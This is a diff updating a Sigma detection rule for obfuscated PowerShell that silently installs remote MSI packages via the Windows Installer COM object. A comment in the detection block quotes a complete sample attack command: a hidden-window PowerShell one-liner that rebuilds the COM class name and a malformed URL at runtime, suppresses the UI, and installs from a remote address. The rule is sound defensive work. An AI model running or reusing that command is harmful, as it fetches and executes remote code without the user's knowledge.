@@ -1,47 +1,45 @@
-title: Malicious use of COM Object for unauthorized MSI Installation
+title: Obfuscated PowerShell Silent MSI Install via WindowsInstaller COM
 id: 7b6a7418-3afc-11f0-aff4-000d3abf478c
-related:
-    - id: e88967df-278a-49f1-a459-b755df65f6ab
-      type: similar
-status: test
+status: experimental
 description: |
-    Detect the usage of the Windows Installer COM object to download and install MSI (Microsoft Installer) files from remote URLs. 
+    Detects the execution of obfuscated PowerShell commands that attempt to silently install MSI packages via the Windows Installer COM object (`WindowsInstaller.Installer`).
+    The technique involves manipulating strings to hide functionality, such as constructing class names using string insertion (e.g., 'indowsInstaller.Installer'.Insert(0,'W')) and correcting
+    malformed URLs (e.g., converting 'htps://' to 'https://') at runtime. This behavior is commonly associated with malware loaders or droppers that aim to bypass static detection
+    by hiding intent in runtime-generated strings and using legitimate tools for code execution. The use of `InstallProduct` and COM object creation, particularly combined with
+    hidden window execution and suppressed UI, indicates an attempt to install software (likely malicious) without user interaction.
 references:
     - https://informationsecuritybuzz.com/the-real-danger-behind-a-simple-windows-shortcut/
     - https://redcanary.com/blog/threat-intelligence/intelligence-insights-may-2025/
+    - https://www.virustotal.com/gui/file/f9710b0ba4de5fa0e7ec27da462d4d2fc6838eba83a19f23f6617a466bbad457
 author: Meroujan Antonyan (vx3r)
 date: 2025-05-27
-modified: 2025-05-27
 tags:
     - attack.defense-evasion
-    - attack.execution
+    - attack.t1027.010
     - attack.t1218.007
+    - attack.execution
     - attack.t1059.001
 logsource:
     category: process_creation
     product: windows
 detection:
+    # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='htps://example.com/';$i=New-Object -ComObject('indowsInstaller.Installer'.Insert(0,'W'));$i.UILevel=2;$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')";
     selection_img:
         - Image|endswith:
-              - '\powershell.exe'
-              - '\pwsh.exe'
+            - '\powershell_ise.exe'
+            - '\powershell.exe'
+            - '\pwsh.exe'
         - OriginalFileName:
-              - 'PowerShell.EXE'
-              - 'pwsh.dll'
+            - 'PowerShell_ISE.EXE'
+            - 'PowerShell.EXE'
+            - 'pwsh.dll'
     selection_cli:
         CommandLine|contains|all:
-            - 'New-Object'
-            - 'InstallProduct'
-            - '-ComObject('
-            # Example of obfuscation: The script may use techniques like splitting or modifying strings to hide URLs.
-            # For instance, "$i.InstallProduct($(if($u.StartsWith('htps://')){$u.Insert(2,'t')}else{$u}),'')"
-            # reconstructs "https://" by inserting the missing 't' dynamically, making detection harder.
-            - 'h'
-            - 't'
-            - 'p'
-            - ':'
-            - '/'
-    condition: all of selection*
+            - '-ComObject'
+            - 'InstallProduct('
+            - '.Insert('
+            - 'UILevel=2'
+    condition: all of selection_*
 falsepositives:
-    - This rule may generate false positives for legitimate scripts that utilize the Windows Installer COM object for standard administrative tasks or software deployment.
+    - Unknown
 level: high
